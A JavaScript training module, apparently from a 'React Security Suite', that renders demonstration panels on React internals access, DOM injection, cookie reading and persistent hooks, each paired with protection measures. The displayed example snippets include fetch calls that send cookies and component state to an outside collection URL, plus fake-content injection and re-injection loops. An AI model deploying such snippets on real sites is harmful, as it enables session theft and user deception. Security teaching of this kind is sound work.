/**
 * React Security Suite - Training Demonstrator
 * 
 * This module provides educational demonstrations of security vulnerabilities
 * in React applications. These demonstrations are for educational purposes only
 * and are designed to run in a controlled environment.
 */

/**
 * Run a security demonstration
 * @param {string} demoType - The type of demonstration to run
 * @param {Object} options - Options for the demonstration
 * @returns {Object} Result of the demonstration
 */
export function runDemonstration(demoType, options = {}) {
  // Ensure we're in training mode
  if (!window.__reactSecuritySuiteTrainingMode) {
    console.error('[React Security Suite] Training mode must be active to run demonstrations');
    return { 
      success: false, 
      error: 'Training mode must be active to run demonstrations' 
    };
  }

  // Log demonstration start
  console.log(`[React Security Suite] Starting demonstration: ${demoType}`);
  
  // Add demo metadata
  const demoMeta = {
    timestamp: new Date().toISOString(),
    demoType,
    options,
    reactVersion: window.React?.version || 'unknown'
  };
  
  // Store demo history for reporting
  if (!window.__reactSecuritySuiteDemoHistory) {
    window.__reactSecuritySuiteDemoHistory = [];
  }
  window.__reactSecuritySuiteDemoHistory.push(demoMeta);
  
  // Show training banner if not already visible
  showTrainingBanner();
  
  // Run the requested demonstration
  switch (demoType) {
    case 'reactInternals':
      return demonstrateReactInternals(options);
    case 'domManipulation':
      return demonstrateDomManipulation(options);
    case 'cookieAccess':
      return demonstrateCookieAccess(options);
    case 'persistentHook':
      return demonstratePersistentHook(options);
    default:
      return { 
        success: false, 
        error: `Unknown demonstration type: ${demoType}` 
      };
  }
}

/**
 * Stop all active demonstrations
 * @returns {boolean} True if demonstrations were stopped
 */
export function stopDemonstrations() {
  // Clean up any active demonstrations
  if (window.__reactSecuritySuiteDemoCleanupFunctions) {
    window.__reactSecuritySuiteDemoCleanupFunctions.forEach(cleanup => {
      try {
        cleanup();
      } catch (error) {
        console.error('[React Security Suite] Error during demonstration cleanup:', error);
      }
    });
    
    window.__reactSecuritySuiteDemoCleanupFunctions = [];
  }
  
  return true;
}

/**
 * Set training mode
 * @param {boolean} active - Whether training mode should be active
 * @returns {boolean} True if mode was set successfully
 */
export function setTrainingMode(active) {
  window.__reactSecuritySuiteTrainingMode = active;
  
  if (active) {
    showTrainingBanner();
  } else {
    hideTrainingBanner();
    stopDemonstrations();
  }
  
  return true;
}

/**
 * Show training mode banner
 */
function showTrainingBanner() {
  const BANNER_ID = 'react-security-suite-training-banner';
  
  if (document.getElementById(BANNER_ID)) {
    return; // Banner already exists
  }
  
  const banner = document.createElement('div');
  banner.id = BANNER_ID;
  banner.style.cssText = `
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    background-color: #ff5722;
    color: white;
    text-align: center;
    padding: 8px;
    font-family: Arial, sans-serif;
    font-weight: bold;
    z-index: 2147483647;
    border-bottom: 2px solid #d84315;
  `;
  banner.textContent = '⚠️ REACT SECURITY TRAINING MODE ACTIVE - FOR EDUCATIONAL PURPOSES ONLY ⚠️';
  
  document.body.prepend(banner);
}

/**
 * Hide training mode banner
 */
function hideTrainingBanner() {
  const BANNER_ID = 'react-security-suite-training-banner';
  const banner = document.getElementById(BANNER_ID);
  
  if (banner) {
    banner.remove();
  }
}

/**
 * Register a cleanup function for a demonstration
 * @param {Function} cleanupFn - Function to call when cleaning up the demonstration
 */
function registerCleanupFunction(cleanupFn) {
  if (!window.__reactSecuritySuiteDemoCleanupFunctions) {
    window.__reactSecuritySuiteDemoCleanupFunctions = [];
  }
  
  window.__reactSecuritySuiteDemoCleanupFunctions.push(cleanupFn);
}

/**
 * Create a demonstration container
 * @returns {HTMLElement} The container element
 */
function createDemoContainer() {
  const container = document.createElement('div');
  container.id = 'react-security-demo-container';
  container.style.cssText = `
    position: fixed;
    top: 40px;
    left: 20px;
    right: 20px;
    background-color: rgba(0, 0, 0, 0.8);
    color: #00ff00;
    font-family: monospace;
    padding: 20px;
    border-radius: 5px;
    z-index: 2147483646;
    max-height: 80vh;
    overflow: auto;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
  `;
  
  document.body.appendChild(container);
  
  // Register cleanup
  registerCleanupFunction(() => {
    container.remove();
  });
  
  return container;
}

/**
 * DEMONSTRATION: React Internals Access
 * @param {Object} options - Demonstration options
 * @returns {Object} Result of the demonstration
 */
function demonstrateReactInternals(options = {}) {
  // Check if React is detected
  if (!window.React && !window.ReactDOM) {
    return { 
      success: false, 
      error: 'React not detected on this page' 
    };
  }
  
  // Create demonstration container
  const container = createDemoContainer();
  
  let demoContent = '<h2>React Internals Access Demonstration</h2>';
  demoContent += '<p>This demonstrates how malicious code could access React internals.</p>';
  demoContent += '<h3>Detected React Information:</h3>';
  
  // Collect React information
  const reactInfo = {
    version: getReactVersion(),
    hasReactDOM: !!window.ReactDOM,
    hasInternals: !!(window.React && window.React.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED),
    hasFiber: !!(window.React && window.React.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED && 
                window.React.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner),
    rootElements: document.querySelectorAll('[data-reactroot]').length,
    possibleComponents: []
  };
  
  // Try to find React components
  const allElements = document.querySelectorAll('*');
  for (const el of allElements) {
    // Check for React instance
    const hasReactInstance = !!(
      el._reactRootContainer ||
      el._reactInternalInstance ||
      el._reactInternals ||
      el.__reactFiber$ ||
      el.__reactInternalInstance$
    );
    
    if (hasReactInstance) {
      reactInfo.possibleComponents.push({
        tagName: el.tagName,
        id: el.id,
        className: el.className
      });
      
      // Limit to 5 components for demo
      if (reactInfo.possibleComponents.length >= 5) {
        break;
      }
    }
  }
  
  // Display React information
  demoContent += `<pre>${JSON.stringify(reactInfo, null, 2)}</pre>`;
  
  // Show how this could be exploited
  demoContent += '<h3>Potential Exploitation:</h3>';
  demoContent += `<p>A malicious script could use this information to:</p>
    <ul>
      <li>Access internal React state</li>
      <li>Modify component behavior</li>
      <li>Inject content into the React component tree</li>
      <li>Monitor React rendering lifecycle</li>
    </ul>`;
  
  // Show example code
  demoContent += '<h3>Example Attack Code:</h3>';
  demoContent += `<pre>
// Malicious code example (DO NOT RUN)
function exploitReactInternals() {
  // Access React internals
  const internals = React.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED;
  
  // Access current fiber
  const currentFiber = internals.ReactCurrentOwner.current;
  
  // Extract component state
  const componentState = currentFiber?.stateNode?.state;
  
  // Send to attacker's server
  fetch('https://attck-deploy.net/attcks/T1119/collect', {
    method: 'POST',
    body: JSON.stringify({ 
      reactState: componentState,
      url: window.location.href
    }),
    headers: { 'Content-Type': 'application/json' }
  });
}
</pre>`;

  demoContent += '<h3>Protection Measures:</h3>';
  demoContent += `<ul>
    <li>Use production builds of React which minimize exposed internals</li>
    <li>Implement Content Security Policy (CSP) to restrict script execution</li>
    <li>Use React's built-in security features and keep it updated</li>
    <li>Consider using tools like React Security Suite to monitor and protect React internals</li>
  </ul>`;
  
  container.innerHTML = demoContent;
  
  return { success: true };
}

/**
 * DEMONSTRATION: DOM Manipulation
 * @param {Object} options - Demonstration options
 * @returns {Object} Result of the demonstration
 */
function demonstrateDomManipulation(options = {}) {
  // Check if React is detected
  if (!window.React && !window.ReactDOM) {
    return { 
      success: false, 
      error: 'React not detected on this page' 
    };
  }
  
  // Create demonstration container
  const container = createDemoContainer();
  
  let demoContent = '<h2>DOM Manipulation Demonstration</h2>';
  demoContent += '<p>This demonstrates how malicious code could manipulate the DOM using React.</p>';
  
  // Find a suitable target for demonstration
  const reactRoot = document.querySelector('[data-reactroot]') || document.getElementById('root');
  let targetFound = false;
  
  if (reactRoot) {
    targetFound = true;
    
    demoContent += '<h3>Target Found:</h3>';
    demoContent += `<p>React root element: ${reactRoot.tagName} (id: ${reactRoot.id || 'none'})</p>`;
    
    // Create a demonstration element
    const demoElement = document.createElement('div');
    demoElement.id = 'react-security-demo-injection';
    demoElement.style.cssText = `
      background-color: #ff0000;
      color: white;
      padding: 10px;
      margin: 10px 0;
      border-radius: 5px;
      font-family: Arial, sans-serif;
      text-align: center;
    `;
    demoElement.innerHTML = '<strong>⚠️ SIMULATED MALICIOUS CONTENT INJECTION ⚠️</strong><br>This content was injected for demonstration purposes only.';
    
    // Show the demonstration element
    demoContent += '<h3>Simulated Injection:</h3>';
    demoContent += '<p>The following content would be injected into the React application:</p>';
    demoContent += demoElement.outerHTML;
    
    // Explain the attack
    demoContent += '<h3>How This Attack Works:</h3>';
    demoContent += `<p>A malicious script could:</p>
      <ol>
        <li>Access the React DOM API</li>
        <li>Create a new element with malicious content</li>
        <li>Render it into the application using ReactDOM.render or createRoot</li>
        <li>This could be used to display fake login forms, misleading messages, or other malicious content</li>
      </ol>`;
    
    // Show code example (for educational purposes)
    demoContent += '<h3>Example Attack Code:</h3>';
    demoContent += `<pre>
// Malicious code example (DO NOT RUN)
const maliciousElement = React.createElement('div', {
  style: {
    backgroundColor: 'red',
    color: 'white',
    padding: '10px',
    margin: '10px 0',
    borderRadius: '5px',
    fontFamily: 'Arial, sans-serif',
    textAlign: 'center'
  }
}, [
  React.createElement('strong', {}, '⚠️ MALICIOUS CONTENT ⚠️'),
  React.createElement('br'),
  'This could be a fake login form or other harmful content'
]);

// Inject using ReactDOM
if (ReactDOM.createRoot) {
  const root = ReactDOM.createRoot(document.getElementById('root'));
  root.render(maliciousElement);
} else if (ReactDOM.render) {
  ReactDOM.render(maliciousElement, document.getElementById('root'));
}
</pre>`;

    demoContent += '<h3>Protection Measures:</h3>';
    demoContent += `<ul>
      <li>Protect ReactDOM.render and createRoot methods from unauthorized access</li>
      <li>Implement Content Security Policy (CSP) to restrict script execution</li>
      <li>Monitor for suspicious DOM mutations</li>
      <li>Use React's built-in security features and keep it updated</li>
    </ul>`;
  } else {
    demoContent += '<h3>No React Root Found</h3>';
    demoContent += '<p>Could not find a React root element to demonstrate the attack.</p>';
  }
  
  container.innerHTML = demoContent;
  
  return { success: true };
}

/**
 * DEMONSTRATION: Cookie Access
 * @param {Object} options - Demonstration options
 * @returns {Object} Result of the demonstration
 */
function demonstrateCookieAccess(options = {}) {
  // Create demonstration container
  const container = createDemoContainer();
  
  let demoContent = '<h2>Cookie Access Demonstration</h2>';
  demoContent += '<p>This demonstrates how malicious code could access cookies.</p>';
  
  // Get cookies (but mask values for security)
  const cookies = document.cookie.split(';').map(cookie => {
    const parts = cookie.trim().split('=');
    const name = parts[0];
    // Mask the actual value
    const value = parts.slice(1).join('=');
    const maskedValue = value.replace(/./g, '*');
    return { name, maskedValue, length: value.length };
  });
  
  demoContent += '<h3>Cookies Found:</h3>';
  
  if (cookies.length > 0) {
    demoContent += '<ul>';
    cookies.forEach(cookie => {
      demoContent += `<li><strong>${cookie.name}</strong>: ${cookie.maskedValue} (${cookie.length} characters)</li>`;
    });
    demoContent += '</ul>';
  } else {
    demoContent += '<p>No cookies found on this page.</p>';
  }
  
  // Explain the attack
  demoContent += '<h3>How This Attack Works:</h3>';
  demoContent += `<p>A malicious script could:</p>
    <ol>
      <li>Access document.cookie to read all non-HttpOnly cookies</li>
      <li>Send this data to a remote server using fetch or XMLHttpRequest</li>
      <li>Use the stolen cookies to impersonate the user</li>
    </ol>`;
  
  // Show code example (for educational purposes)
  demoContent += '<h3>Example Attack Code:</h3>';
  demoContent += `<pre>
// Malicious code example (DO NOT RUN)
const stolenCookies = document.cookie;

// Send to attacker's server
fetch('https://attck-deploy.net/attcks/T1119/collect', {
  method: 'POST',
  body: JSON.stringify({ cookies: stolenCookies }),
  headers: { 'Content-Type': 'application/json' }
});
</pre>`;

  demoContent += '<h3>Protection Measures:</h3>';
  demoContent += `<ul>
    <li>Use HttpOnly flag for sensitive cookies</li>
    <li>Implement proper Content Security Policy (CSP)</li>
    <li>Use SameSite cookie attribute</li>
    <li>Implement token-based authentication with short-lived tokens</li>
    <li>Monitor cookie access patterns</li>
  </ul>`;
  
  container.innerHTML = demoContent;
  
  return { success: true };
}

/**
 * DEMONSTRATION: Persistent Hook
 * @param {Object} options - Demonstration options
 * @returns {Object} Result of the demonstration
 */
function demonstratePersistentHook(options = {}) {
  // Check if React is detected
  if (!window.React && !window.ReactDOM) {
    return { 
      success: false, 
      error: 'React not detected on this page' 
    };
  }
  
  // Create demonstration container
  const container = createDemoContainer();
  
  let demoContent = '<h2>Persistent Hook Demonstration</h2>';
  demoContent += '<p>This demonstrates how malicious code could create persistent hooks in React.</p>';
  
  // Create a counter to simulate persistence
  let hookCounter = 0;
  
  // Create a demonstration element to show the hook in action
  const hookIndicator = document.createElement('div');
  hookIndicator.id = 'react-security-hook-indicator';
  hookIndicator.style.cssText = `
    position: fixed;
    bottom: 20px;
    right: 20px;
    background-color: #ff0000;
    color: white;
    padding: 10px;
    border-radius: 5px;
    font-family: Arial, sans-serif;
    z-index: 2147483645;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
  `;
  hookIndicator.innerHTML = '<strong>Persistent Hook Demo:</strong> Hook executed 0 times';
  
  document.body.appendChild(hookIndicator);
  
  // Set up the interval to simulate a persistent hook
  const hookInterval = setInterval(() => {
    hookCounter++;
    hookIndicator.innerHTML = `<strong>Persistent Hook Demo:</strong> Hook executed ${hookCounter} times`;
  }, 2000);
  
  // Register cleanup
  registerCleanupFunction(() => {
    clearInterval(hookInterval);
    hookIndicator.remove();
  });
  
  // Explain the attack
  demoContent += '<h3>How This Attack Works:</h3>';
  demoContent += `<p>A malicious script could:</p>
    <ol>
      <li>Set up intervals or observers to detect React re-renders</li>
      <li>Re-inject malicious code whenever the application updates</li>
      <li>Maintain persistence even if the initial injection is removed</li>
      <li>Monitor user interactions and application state changes</li>
    </ol>`;
  
  // Show code example (for educational purposes)
  demoContent += '<h3>Example Attack Code:</h3>';
  demoContent += `<pre>
// Malicious code example (DO NOT RUN)
const hookInterval = 2000; // Reinjection interval in ms

const inject = () => {
  const container = document.getElementById('root');
  const react = window.React;
  const reactDom = window.ReactDOM;

  if (!container || !react || !reactDom) return;

  // Malicious actions here...
  console.log('Malicious hook executed');
  
  // Could exfiltrate data
  // Could inject content
  // Could monitor user activity
};

// Initial injection
inject();

// Persistent hook
setInterval(inject, hookInterval);
</pre>`;

  demoContent += '<h3>Protection Measures:</h3>';
  demoContent += `<ul>
    <li>Monitor for suspicious intervals and timers</li>
    <li>Use Content Security Policy (CSP) to restrict script execution</li>
    <li>Implement subresource integrity checks</li>
    <li>Use React's built-in security features and keep it updated</li>
    <li>Consider using tools like React Security Suite to monitor and protect React applications</li>
  </ul>`;
  
  container.innerHTML = demoContent;
  
  return { success: true };
}

/**
 * Get React version if available
 * @returns {string} React version or 'unknown'
 */
function getReactVersion() {
  let version = 'unknown';
  
  if (window.React && window.React.version) {
    version = window.React.version;
  } else if (document.querySelector('[data-reactroot]')) {
    version = '16+';
  } else if (document.querySelector('[data-reactid]')) {
    version = '15 or earlier';
  }
  
  return version;
}
